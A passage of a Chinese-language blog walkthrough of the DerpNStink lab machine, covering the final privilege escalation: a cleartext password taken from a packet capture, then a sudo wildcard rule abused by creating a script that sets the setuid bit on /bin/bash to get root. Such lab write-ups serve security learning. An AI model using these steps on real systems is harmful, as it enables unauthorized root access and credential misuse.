+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">stinky@DeRPnStiNK:~$ cat ftp/files/network-logs/derpissues.txt</span><br><span class="line">cat ftp/files/network-logs/derpissues.txt</span><br><span class="line">12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?</span><br><span class="line">12:07 stinky: yeah. did you need a password reset?</span><br><span class="line">12:07 mrderp: I think i accidently deleted my account</span><br><span class="line">12:07 mrderp: i just need to logon once to make a change</span><br><span class="line">12:07 stinky: im gonna packet capture so we can figure out whats going on</span><br><span class="line">12:07 mrderp: that seems a bit overkill, but wtv</span><br><span class="line">12:08 stinky: commence the sniffer!!!!</span><br><span class="line">12:08 mrderp: -_-</span><br><span class="line">12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?</span><br><span class="line">12:11 mrderp: awesome it works!</span><br><span class="line">12:12 stinky: we really are the best sysadmins #team</span><br><span class="line">12:13 mrderp: i guess we are...</span><br><span class="line">12:15 mrderp: alright I made the changes, feel free to decomission my account</span><br><span class="line">12:20 stinky: done! yay</span><br><span class="line">stinky@DeRPnStiNK:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>这个东西说另一个用户发现无法登录了，请求我们当前用户协助检查。我们当前用户决定启动一个sniffer来排查一下，回想到之前在家目录下面还有一个.pcap文件没有看到过，直接起个python服务器给他下载下来</p>
+<p>wireshark打开设置好过滤器后出现三个数据包，我们来看看<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411140206421.png"
+                      alt="image-20250411140206421"
+                ></p>
+<p>追踪http流可以看到mrderp的明文密码<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/Enchanter-W/Pics/master/image-20250411140253134.png"
+                      alt="image-20250411140253134"
+                ></p>
+<p>尝试利用该密码切换用户</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stinky@DeRPnStiNK:~$ su mrderp</span><br><span class="line">su mrderp</span><br><span class="line">Password: derpderpderpderpderpderpderp</span><br><span class="line"></span><br><span class="line">mrderp@DeRPnStiNK:/home/stinky$ </span><br></pre></td></tr></table></figure></div>
+
+<h3 id="mrderp"><a href="#mrderp" class="headerlink" title="mrderp"></a>mrderp</h3><p>然后重复之前的枚举步骤发现</p>
+<p>sudo -l存在执行</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> mrderp: derpderpderpderpderpderpderp</span><br><span class="line"></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> mrderp on DeRPnStiNK:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User mrderp may run the following commands on DeRPnStiNK:</span><br><span class="line">    (ALL) /home/mrderp/binaries/derpy*</span><br><span class="line">mrderp@DeRPnStiNK:/home/stinky$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>家目录下有一个能够root执行的文件，但是尝试执行时候我发现文件不存在。这个地方我们可以自己手动创建一个这个文件然后就能以root权限来执行这个文件了</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">User mrderp may run the following commands on DeRPnStiNK:</span><br><span class="line">    (ALL) /home/mrderp/binaries/derpy*</span><br><span class="line">mrderp@DeRPnStiNK:/home/stinky$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/stinky</span><br><span class="line">mrderp@DeRPnStiNK:/home/stinky$ <span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line">mrderp@DeRPnStiNK:/home$ <span class="built_in">cd</span> mrderp</span><br><span class="line"><span class="built_in">cd</span> mrderp</span><br><span class="line">mrderp@DeRPnStiNK:~$ <span class="built_in">mkdir</span> binaries</span><br><span class="line"><span class="built_in">mkdir</span> binaries</span><br><span class="line">mrderp@DeRPnStiNK:~$ <span class="built_in">cd</span> binaries</span><br><span class="line"><span class="built_in">cd</span> binaries</span><br><span class="line">mrderp@DeRPnStiNK:~/binaries$ <span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt;derpy.sh</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt;derpy.sh</span><br><span class="line">mrderp@DeRPnStiNK:~/binaries$ <span class="built_in">chmod</span> +x derpy.sh</span><br><span class="line"><span class="built_in">chmod</span> +x derpy.sh</span><br><span class="line">mrderp@DeRPnStiNK:~/binaries$ <span class="built_in">sudo</span> ./derpy.sh</span><br><span class="line"><span class="built_in">sudo</span> ./derpy.sh</span><br><span class="line">mrderp@DeRPnStiNK:~/binaries$ /bin/bash -p</span><br><span class="line">/bin/bash -p</span><br><span class="line">bash-4.3# <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(mrderp) gid=1000(mrderp) euid=0(root) egid=0(root) <span class="built_in">groups</span>=0(root),1000(mrderp)</span><br></pre></td></tr></table></figure></div>
+
+<p>至此提权成功</p>
+<h3 id="root-flag"><a href="#root-flag" class="headerlink" title="root_flag"></a>root_flag</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">bash-4.3# <span class="built_in">cat</span> flag.txt</span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)</span><br><span class="line"></span><br><span class="line">Congrats on rooting my first VulnOS!</span><br><span class="line"></span><br><span class="line">Hit me up on twitter and <span class="built_in">let</span> me know your thoughts!</span><br><span class="line"></span><br><span class="line">@securekomodo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash-4.3# ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:0c:29:4a:30:f8 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.55.129/24 brd 192.168.55.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::20c:29ff:fe4a:30f8/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">bash-4.3# </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><p>这个靶机提权部分对我来说还是很有意思的，能用到之前学过的很多东西，至少让我觉得我真的有学到些什么了。中间看了两次wp，一次是pcap文件的发现，我第一次压根没注意到这个东西虽然看到了他俩的对话文件但是没有想到要搜索这些。另一次是root的提权，还是因为没有系统性的学过Linux的提权方法所以没有想到可以自己手动创建文件来执行。</p>
+<p>总的来说是一次很流畅的打靶，就是时间用的有点太多了，前前后后从早上9：00开始到11：20才拿下root_shell。操作连贯性还是有待加强</p>
+<p>这个命令来全览看文件确实好用</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -laRh</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Derpnstink靶机</li>
+        <li><strong>Author:</strong> EnchanterW</li>
+        <li><strong>Created at
+                :</strong> 2025-04-11 17:11:52</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-05-27 21:27:11
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://enchanter-w.github.io/2025/04/11/DeRPnStiNK/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux%E6%8F%90%E6%9D%83/">#Linux提权</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/WordPress/">#WordPress</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">#漏洞利用</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Metasploit/">#Metasploit</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/04/12/16.5Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E5%AE%8C%E5%85%A8%E7%89%88/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Windows权限提升完全不会版</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/04/11/Djinn/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Djinn</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="gitalk-container"></div>
+    <script data-swup-reload-script
+            src="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js"></script>
+    <script data-swup-reload-script>
+
+        function loadGitalk() {
+            let __gitalk__pathname = decodeURI(location.pathname);
+            const __gitalk__pathnameLength = __gitalk__pathname.length;
+            const __gitalk__pathnameMaxLength = 50;
+            if (__gitalk__pathnameLength > __gitalk__pathnameMaxLength) {
+                __gitalk__pathname = __gitalk__pathname.substring(0, __gitalk__pathnameMaxLength - 3) + '...';
+            }
+
+            try {
+                Gitalk && new Gitalk({
+                    clientID: 'Ov23lip7146xc7G8Iupv',
+                    clientSecret: '3feaa459aa74d18139291e797beac7dc1f7acad0',
+                    repo: '66Gitalk',
+                    owner: 'Enchanter-W',
+                    admin: ['Enchanter-W'],
+                    id: __gitalk__pathname,
+                    language: 'en',
+                    proxy: 'https://cors-anywhere.1l1.icu/https://github.com/login/oauth/access_token'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">Derpnstink靶机</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">靶机发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Nmap-%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C"><span class="nav-text">Nmap 扫描结果</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B-%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="nav-text">端口探测&amp;服务探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#21%E7%AB%AF%E5%8F%A3"><span class="nav-text">21端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#22%E7%AB%AF%E5%8F%A3"><span class="nav-text">22端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="nav-text">80端口</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="nav-text">web服务探测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WordPress-%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="nav-text">WordPress 用户枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%8B%E8%B6%B3%E7%82%B9%E8%8E%B7%E5%8F%96"><span class="nav-text">立足点获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">机器信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#www-data"><span class="nav-text">www-data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stinky"><span class="nav-text">stinky</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mrderp"><span class="nav-text">mrderp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root-flag"><span class="nav-text">root_flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%A4%8D%E7%9B%98"><span class="nav-text">总结复盘</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">EnchanterW</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        14 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
